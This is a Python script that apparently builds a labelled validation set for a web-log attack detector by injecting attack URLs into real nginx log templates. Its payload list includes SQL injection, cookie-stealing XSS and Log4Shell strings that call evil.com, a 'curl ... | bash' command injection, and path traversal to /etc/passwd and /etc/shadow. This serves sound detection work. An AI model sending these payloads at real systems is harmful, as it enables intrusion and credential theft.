#!/usr/bin/env python3
from __future__ import annotations

import json
import random
import sys
from collections import Counter
from pathlib import Path

ATTACK_PAYLOADS = {
    "sqli": [
        "/api/v1/users?id=1' OR 1=1--",
        "/api/v1/search?q=admin' UNION SELECT username,password FROM users--",
        "/api/v1/items?sort=name;DROP TABLE users--",
        "/api/v1/auth?user=admin'/**/OR/**/1=1--",
        "/api/v1/products?id=1 AND SLEEP(5)",
        "/api/v1/login?username=admin'--&password=x",
        "/api/v1/data?filter=1' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
        "/api/v1/reports?year=2024' OR 'x'='x",
    ],
    "xss": [
        "/api/v1/comments?text=<script>alert(document.cookie)</script>",
        "/api/v1/search?q=<img src=x onerror=alert(1)>",
        "/api/v1/profile?name=<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>",
        '/api/v1/feedback?msg="><script>new Image().src="https://evil.com/?c="+document.cookie</script>',
    ],
    "path_traversal": [
        "/api/v1/files/../../../etc/passwd",
        "/api/v1/download?file=....//....//etc/shadow",
        "/api/v1/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/api/v1/read?path=/proc/self/environ",
        "/static/..%252f..%252f..%252fetc/passwd",
    ],
    "command_injection": [
        "/api/v1/ping?host=127.0.0.1;cat /etc/passwd",
        "/api/v1/tools/lookup?domain=google.com|whoami",
        "/api/v1/convert?file=test`id`",
        "/api/v1/exec?cmd=ls%20-la%20/",
        "/api/v1/health?check=$(curl http://evil.com/shell.sh|bash)",
    ],
    "webshell": [
        "/uploads/cmd.php?cmd=id",
        "/images/c99.php",
        "/wp-content/uploads/shell.php?action=exec&cmd=whoami",
        "/tmp/backdoor.jsp?pass=admin&cmd=cat+/etc/passwd",
        "/.hidden/webshell.asp?exec=net+user",
    ],
    "ssrf": [
        "/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/api/v1/proxy?target=http://localhost:6379/INFO",
        "/api/v1/webhook?callback=http://127.0.0.1:22",
        "/api/v1/import?source=file:///etc/passwd",
        "/api/v1/preview?link=http://internal-admin.local/admin",
    ],
    "log4shell": [
        "/api/v1/login?user=${jndi:ldap://evil.com/exploit}",
        "/api/v1/search?q=${jndi:rmi://attacker.com:1099/obj}",
        "/api/v1/data?ref=${jndi:ldap://x.${hostName}.evil.com/a}",
    ],
    "scanner": [
        "/wp-admin/",
        "/wp-login.php",
        "/.env",
        "/.git/config",
        "/phpmyadmin/",
        "/admin/",
        "/actuator/env",
        "/server-status",
        "/.aws/credentials",
        "/config.php.bak",
        "/api/swagger.json",
        "/debug/vars",
        "/telescope/requests",
    ],
    "bruteforce_401": [
        "/api/v1/auth/login",  # will be sent many times with 401
    ],
}

SCANNER_UAS = [
    "sqlmap/1.7#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
    "gobuster/3.6",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    "python-requests/2.31.0 (vulnerability scanner)",
]


def load_real_templates(val_path: Path, n: int = 100) -> list[dict]:
    templates = []
    with open(val_path, encoding="utf-8") as f:
        lines = []
        for i, line in enumerate(f):
            line = line.strip()
            if line:
                lines.append(line)
            if len(lines) >= 5000:
                break
    random.shuffle(lines)
    for line in lines[:n]:
        try:
            templates.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return templates


def inject_attack(template: dict, url: str, status: int = 200, ua: str | None = None) -> dict:
    entry = dict(template)
    entry["url"] = url
    entry["statusCode"] = status
    if ua:
        entry["userAgent"] = ua
    return entry


def generate_attacks(val_path: Path, count: int = 5000) -> list[dict]:
    templates = load_real_templates(val_path)
    if not templates:
        print("ERROR: no templates loaded", file=sys.stderr)
        sys.exit(1)

    attacks = []
    categories = list(ATTACK_PAYLOADS.keys())

    for _ in range(count):
        cat = random.choice(categories)
        tmpl = random.choice(templates)
        url = random.choice(ATTACK_PAYLOADS[cat])

        if cat == "scanner":
            ua = random.choice(SCANNER_UAS) if random.random() < 0.5 else tmpl.get("userAgent", "")
            status = random.choice([200, 403, 404])
        elif cat == "bruteforce_401":
            ua = tmpl.get("userAgent", "")
            status = 401
        elif cat in ("sqli", "xss", "command_injection", "log4shell"):
            ua = random.choice(SCANNER_UAS) if random.random() < 0.3 else tmpl.get("userAgent", "")
            status = random.choice([200, 403, 500])
        elif cat == "webshell":
            ua = tmpl.get("userAgent", "")
            status = 200
        else:
            ua = tmpl.get("userAgent", "")
            status = random.choice([200, 301, 403, 500])

        entry = inject_attack(tmpl, url, status, ua)
        entry["_attack_category"] = cat  # label for validation
        attacks.append(entry)

    return attacks


def main() -> None:
    val_path = Path("data/logs/nginx_val.jsonl")
    out_attacks = Path("data/logs/attacks_realistic.jsonl")
    out_val_mixed = Path("data/logs/nginx_val_mixed.jsonl")

    print("Generating realistic attacks...")
    attacks = generate_attacks(val_path, count=5000)
    print(f"  Generated {len(attacks)} attack entries")

    cats = Counter(a["_attack_category"] for a in attacks)
    for cat, n in cats.most_common():
        print(f"    {cat}: {n}")

    with open(out_attacks, "w", encoding="utf-8") as f:
        for a in attacks:
            f.write(json.dumps(a, ensure_ascii=False) + "\n")
    print(f"  Attacks saved to {out_attacks}")

    print("Creating mixed validation set...")
    clean_lines = []
    with open(val_path, encoding="utf-8") as f:
        for i, line in enumerate(f):
            if i >= 50000:
                break
            clean_lines.append(line.strip())

    mixed = []
    for line in clean_lines:
        mixed.append(json.dumps({"_label": "clean", **json.loads(line)}, ensure_ascii=False))
    for a in attacks:
        cat = a.pop("_attack_category")
        mixed.append(json.dumps({"_label": f"attack:{cat}", **a}, ensure_ascii=False))

    random.shuffle(mixed)
    with open(out_val_mixed, "w", encoding="utf-8") as f:
        for line in mixed:
            f.write(line + "\n")
    print(f"  Mixed set: {len(mixed)} entries ({len(clean_lines)} clean + {len(attacks)} attacks)")
    print(f"  Saved to {out_val_mixed}")


if __name__ == "__main__":
    main()
